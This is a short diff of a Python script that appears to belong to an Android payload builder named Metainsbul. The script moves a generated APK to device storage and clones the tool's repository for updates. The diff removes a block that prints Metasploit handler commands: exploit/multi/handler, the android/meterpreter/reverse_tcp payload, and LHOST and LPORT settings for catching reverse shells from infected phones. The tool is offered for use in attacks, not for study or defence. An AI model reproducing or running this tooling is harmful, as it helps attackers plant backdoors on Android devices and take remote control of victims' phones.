@@ -16,24 +16,6 @@ def build_payload():
 
     os.system(f"mv {apk_name}.apk /storage/emulated/0/")
 
-    control_apk = input("Do you want to control your Payload Now? (Y/N) ").strip()
-    if control_apk.lower() == 'y':
-        print(" Copy and paste the commands in msfconsole (msf6)")
-        print("_____________________________")
-        print("use exploit/multi/handler")
-        print("_____________________________")
-        print("set payload android/meterpreter/reverse_tcp")
-        print("_____________________________")
-        print(f"set LHOST {lhost}")
-        print("_____________________________")
-        print(f"set LPORT {Lport}")
-        print("_____________________________")
-        print("exploit")
-        
-    elif control_apk.lower() == 'n':
-        return 
-    else:
-        print("Invalid input. Please enter 'Y' or 'N'.")
 
 def update():
     os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
